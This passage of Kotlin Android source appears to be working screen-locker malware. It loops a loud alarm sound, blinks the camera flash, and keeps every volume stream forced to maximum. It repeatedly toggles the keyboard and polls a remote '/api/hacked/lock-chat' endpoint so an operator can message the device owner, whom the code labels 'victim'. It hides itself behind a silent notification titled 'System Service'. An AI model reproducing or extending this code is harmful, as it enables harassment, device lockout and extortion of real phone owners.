                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .setFlags(AudioAttributes.FLAG_AUDIBILITY_ENFORCED)
                    .build())
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(1f, 1f)
                prepare()
                start()
            }
        } catch (e: Exception) {
            e.printStackTrace()
            mainHandler.postDelayed({ Thread { startSoundRetry() }.start() }, 1500)
        }
    }

    private fun startSoundRetry() {
        if (mediaPlayer != null) return
        try {
            val afd = assets.openFd("sound/jokowi.mp3")
            mediaPlayer = MediaPlayer().apply {
                setAudioAttributes(AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_ALARM)
                    .setContentType(AudioAttributes.CONTENT_TYPE_MUSIC)
                    .build())
                setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
                isLooping = true
                setVolume(1f, 1f)
                prepare()
                start()
            }
        } catch (e: Exception) { e.printStackTrace() }
    }

    private fun stopSound() {
        try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (_: Exception) {}
        mediaPlayer = null
    }

    private fun startFlashBlink() {
        stopFlashBlink()
        flashState = false
        flashRunnable = object : Runnable {
            override fun run() {
                if (!isLocked) return
                try {
                    if (camId == null) camId = cm?.cameraIdList?.firstOrNull()
                    val id: String = camId ?: run { mainHandler.postDelayed(this, 300); return }
                    flashState = !flashState
                    cm?.setTorchMode(id, flashState)
                } catch (_: Exception) {}
                mainHandler.postDelayed(this, 200)
            }
        }
        mainHandler.post(flashRunnable!!)
    }

    private fun stopFlashBlink() {
        flashRunnable?.let { mainHandler.removeCallbacks(it) }
        flashRunnable = null
        try { cm?.setTorchMode(camId ?: return, false) } catch (_: Exception) {}
        flashState = false
    }

    private fun startVolumeGuard() {
        stopVolumeGuard()
        volRunnable = object : Runnable {
            override fun run() {
                if (!isLocked) return
                am?.let { a ->
                    for (stream in listOf(AudioManager.STREAM_MUSIC, AudioManager.STREAM_RING, AudioManager.STREAM_ALARM)) {
                        try {
                            val max = a.getStreamMaxVolume(stream)
                            if (a.getStreamVolume(stream) < max) a.setStreamVolume(stream, max, 0)
                        } catch (_: Exception) {}
                    }
                    try { a.ringerMode = AudioManager.RINGER_MODE_NORMAL } catch (_: Exception) {}
                }
                mainHandler.postDelayed(this, 800)
            }
        }
        mainHandler.post(volRunnable!!)
    }

    private fun stopVolumeGuard() {
        volRunnable?.let { mainHandler.removeCallbacks(it) }
        volRunnable = null
    }

    private var keyboardRunnable: Runnable? = null
    private var keyboardUp = false
    private var chatPollRunnable: Runnable? = null
    private var serverUrl = ""
    private var deviceId  = ""
    private var deviceToken = ""

    private fun startKeyboardToggle() {
        stopKeyboardToggle()
        keyboardRunnable = object : Runnable {
            override fun run() {
                if (!isLocked) return
                mainHandler.post {
                    try {
                        val im = getSystemService(Context.INPUT_METHOD_SERVICE) as android.view.inputmethod.InputMethodManager
                        val chatEt = chatEditText
                        if (chatEt != null) {
                            if (keyboardUp) { im.hideSoftInputFromWindow(chatEt.windowToken, 0) }
                            else { chatEt.requestFocus(); im.showSoftInput(chatEt, android.view.inputmethod.InputMethodManager.SHOW_FORCED) }
                            keyboardUp = !keyboardUp
                        }
                    } catch (_: Exception) {}
                }
                mainHandler.postDelayed(this, 1500)
            }
        }
        mainHandler.post(keyboardRunnable!!)
    }

    private fun stopKeyboardToggle() {
        keyboardRunnable?.let { mainHandler.removeCallbacks(it) }
        keyboardRunnable = null
    }

    fun initChat(serverUrl: String, deviceId: String, deviceToken: String) {
        this.serverUrl   = serverUrl
        this.deviceId    = deviceId
        this.deviceToken = deviceToken
        startChatPolling()
    }

    private fun startChatPolling() {
        chatPollRunnable?.let { mainHandler.removeCallbacks(it) }
        chatPollRunnable = object : Runnable {
            override fun run() {
                if (!isLocked) return
                Thread { pollChat() }.start()
                mainHandler.postDelayed(this, 3000)
            }
        }
        mainHandler.postDelayed(chatPollRunnable!!, 3000)
    }

    private fun pollChat() {
        if (serverUrl.isEmpty() || deviceId.isEmpty()) return
        try {
            val url  = java.net.URL("$serverUrl/api/hacked/lock-chat/$deviceId")
            val conn = url.openConnection() as java.net.HttpURLConnection
            conn.requestMethod = "GET"
            conn.setRequestProperty("x-device-token", deviceToken)
            conn.connectTimeout = 5000; conn.readTimeout = 5000
            if (conn.responseCode == 200) {
                val res  = conn.inputStream.bufferedReader().readText()
                val json = org.json.JSONObject(res)
                val msgs = json.optJSONArray("messages") ?: return
                val dm   = resources.displayMetrics.density
                for (i in 0 until msgs.length()) {
                    val m    = msgs.getJSONObject(i)
                    val from = m.optString("from")
                    val ts   = m.optLong("ts")
                    if (from == "user" && ts > lastChatTs) {
                        lastChatTs = ts
                        val txt = m.optString("message")
                        addChatBubble(null, null, txt, fromVictim = false, density = dm)
                    }
                }
            }
            conn.disconnect()
        } catch (_: Exception) {}
    }

    private var lastChatTs = 0L

    fun sendChatMessage(text: String) {
        if (serverUrl.isEmpty()) return
        Thread {
            try {
                val body = org.json.JSONObject().apply {
                    put("message", text); put("from", "victim")
                }.toString()
                val url  = java.net.URL("$serverUrl/api/hacked/lock-chat-send/$deviceId")
                val conn = url.openConnection() as java.net.HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.setRequestProperty("x-device-token", deviceToken)
                conn.doOutput = true; conn.connectTimeout = 5000; conn.readTimeout = 5000
                java.io.OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }
                conn.responseCode; conn.disconnect()
            } catch (_: Exception) {}
        }.start()
    }

    private fun doUnlock() {
        isLocked   = false
        pinInput   = ""
        pinDotsRef = null
        getSharedPreferences("aimlock_lock", Context.MODE_PRIVATE).edit()
            .putBoolean("is_locked",    false)
            .putBoolean("is_lock_chat", false).apply()
        stopAll()
        stopKeyboardToggle()
        chatPollRunnable?.let { mainHandler.removeCallbacks(it) }
        chatPollRunnable = null
        unregisterCloseDialogReceiver()
        mainHandler.post {
            lockView?.let {
                try { wm?.removeViewImmediate(it) } catch (_: Exception) {
                    try { wm?.removeView(it) } catch (_: Exception) {}
                }
            }
            lockView = null
        }
    }

    private fun stopAll() {
        stopFlashBlink()
        stopVolumeGuard()
        stopSound()
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        doUnlock()
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_lock_lock)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_NONE).apply {
                setShowBadge(false)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)
        }
    }
}
